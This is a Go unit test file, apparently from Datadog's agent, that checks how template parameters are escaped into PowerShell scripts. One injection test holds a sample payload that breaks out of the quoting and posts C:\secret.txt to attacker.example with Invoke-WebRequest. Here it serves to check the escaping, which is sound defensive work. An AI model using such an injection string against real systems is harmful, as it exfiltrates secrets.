// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2025-present Datadog, Inc.

// Tests for transformInlineScript live in a separate file so they can run on
// all platforms (the production code is windows-only, but the logic under test
// has no OS dependency).

package com_datadoghq_script

import (
	"strings"
	"testing"
)

func TestTransformInlineScript_SimpleParam(t *testing.T) {
	script := `Write-Output "Hello {{ parameters.name }}"`
	result, err := transformInlineScript(script, map[string]any{"name": "Alice"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Value must appear in the preamble as a single-quoted string literal.
	if !strings.Contains(result.Script, "$__par_name = 'Alice'") {
		t.Errorf("expected assignment in preamble, got:\n%s", result.Script)
	}
	// The script body must reference the variable, not the raw value.
	if !strings.Contains(result.Script, `Write-Output "Hello $__par_name"`) {
		t.Errorf("expected variable reference in body, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_InjectionPrevented(t *testing.T) {
	script := `Write-Output "Hello {{ parameters.name }}"`
	malicious := `"; Invoke-WebRequest http://attacker.example -Body (Get-Content C:\secret.txt); Write-Output "`
	result, err := transformInlineScript(script, map[string]any{"name": malicious})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// The value must be wrapped in single quotes in the preamble — making it a
	// string literal, not executable code.
	if !strings.Contains(result.Script, "$__par_name = '") {
		t.Errorf("expected single-quoted assignment, got:\n%s", result.Script)
	}
	// The script body must only reference the variable, keeping user data out of
	// any executable code position.
	if !strings.Contains(result.Script, `Write-Output "Hello $__par_name"`) {
		t.Errorf("expected safe variable reference in body, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_SingleQuoteInValue(t *testing.T) {
	script := `Write-Output "{{ parameters.name }}"`
	result, err := transformInlineScript(script, map[string]any{"name": "d'Artagnan"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Single quote must be doubled inside the PS literal.
	if !strings.Contains(result.Script, "$__par_name = 'd''Artagnan'") {
		t.Errorf("expected escaped single quote in preamble, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_DollarSignInValue(t *testing.T) {
	script := `Write-Output "{{ parameters.pw }}"`
	result, err := transformInlineScript(script, map[string]any{"pw": "MyNameIs$$$"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Dollar signs are literal inside single-quoted strings — no escaping needed.
	if !strings.Contains(result.Script, "$__par_pw = 'MyNameIs$$$'") {
		t.Errorf("expected literal $ in preamble, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_WindowsPathInValue(t *testing.T) {
	script := `Get-Content "{{ parameters.path }}"`
	path := `C:\Program/ Files\Datadog\datadog.yaml`
	result, err := transformInlineScript(script, map[string]any{"path": path})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Backslashes and forward slashes are literal in single-quoted strings.
	expected := `$__par_path = 'C:\Program/ Files\Datadog\datadog.yaml'`
	if !strings.Contains(result.Script, expected) {
		t.Errorf("expected path preserved verbatim, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_NestedParam(t *testing.T) {
	script := `Write-Output "{{ parameters.a.b.c.d.e }}"`
	params := map[string]any{
		"a": map[string]any{"b": map[string]any{"c": map[string]any{"d": map[string]any{"e": "deep"}}}},
	}
	result, err := transformInlineScript(script, params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(result.Script, "$__par_a_b_c_d_e = 'deep'") {
		t.Errorf("unexpected script:\n%s", result.Script)
	}
}

func TestTransformInlineScript_RootParametersRejected(t *testing.T) {
	_, err := transformInlineScript(`Write-Output "{{ parameters }}"`, map[string]any{"x": "y"})
	if err == nil || !strings.Contains(err.Error(), "{{ parameters }} is not supported") {
		t.Errorf("expected unsupported error for root parameters expression, got: %v", err)
	}
}

func TestTransformInlineScript_ExceedsMaxDepth(t *testing.T) {
	_, err := transformInlineScript(`Write-Output "{{ parameters.a.b.c.d.e.f }}"`, map[string]any{})
	if err == nil || !strings.Contains(err.Error(), "maximum supported nesting depth") {
		t.Errorf("expected depth error, got: %v", err)
	}
}

func TestTransformInlineScript_MissingParam(t *testing.T) {
	result, err := transformInlineScript(`Write-Output "{{ parameters.optional }}"`, map[string]any{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(result.Script, "$__par_optional = $null") {
		t.Errorf("expected $null default, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_NoParams(t *testing.T) {
	script := `Write-Output "Hello World"`
	result, err := transformInlineScript(script, map[string]any{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Script != script {
		t.Errorf("param-free script should be unchanged, got:\n%s", result.Script)
	}
}

func TestTransformInlineScript_DuplicateRef(t *testing.T) {
	script := `Write-Output "{{ parameters.x }} {{ parameters.x }}"`
	result, err := transformInlineScript(script, map[string]any{"x": "val"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Only one assignment should appear in the preamble.
	count := strings.Count(result.Script, "$__par_x = ")
	if count != 1 {
		t.Errorf("expected exactly 1 assignment, got %d:\n%s", count, result.Script)
	}
}

func TestTransformInlineScript_VarNameCollision(t *testing.T) {
	// parameters.foo-bar and parameters.foo_bar both sanitize to __par_foo_bar.
	script := `Write-Output "{{ parameters.foo-bar }} {{ parameters.foo_bar }}"`
	_, err := transformInlineScript(script, map[string]any{"foo-bar": "a", "foo_bar": "b"})
	if err == nil || !strings.Contains(err.Error(), "both map to PowerShell variable") {
		t.Errorf("expected collision error, got: %v", err)
	}
}

func TestPowershellLiteral(t *testing.T) {
	tests := []struct {
		input any
		want  string
	}{
		{nil, "$null"},
		{true, "$true"},
		{false, "$false"},
		{float64(42), "42"},
		{float64(3.14), "3.14"},
		{"hello", "'hello'"},
		{"d'Artagnan", "'d''Artagnan'"},
		{"MyNameIs$$$", "'MyNameIs$$$'"},
		{`C:\path\file.txt`, `'C:\path\file.txt'`},
		{map[string]any{"k": "v"}, `'{"k":"v"}'`},
		{map[string]any{"url": "a&b<c>d"}, `'{"url":"a&b<c>d"}'`}, // & < > must not be HTML-escaped
	}
	for _, tc := range tests {
		got, err := powershellLiteral(tc.input)
		if err != nil {
			t.Errorf("powershellLiteral(%v): unexpected error: %v", tc.input, err)
			continue
		}
		if got != tc.want {
			t.Errorf("powershellLiteral(%v) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

func TestPathToVarName(t *testing.T) {
	tests := []struct {
		path []string
		want string
	}{
		{[]string{"parameters", "name"}, "__par_name"},
		{[]string{"parameters", "address", "city"}, "__par_address_city"},
		{[]string{"parameters", "items", "[0]"}, "__par_items__0_"}, // bracket notation → underscores
		{[]string{"parameters", "foo-bar"}, "__par_foo_bar"},        // hyphen → underscore
		{[]string{"parameters", "a", "b", "c", "d", "e"}, "__par_a_b_c_d_e"},
	}
	for _, tc := range tests {
		got := pathToVarName(tc.path)
		if got != tc.want {
			t.Errorf("pathToVarName(%v) = %q, want %q", tc.path, got, tc.want)
		}
	}
}
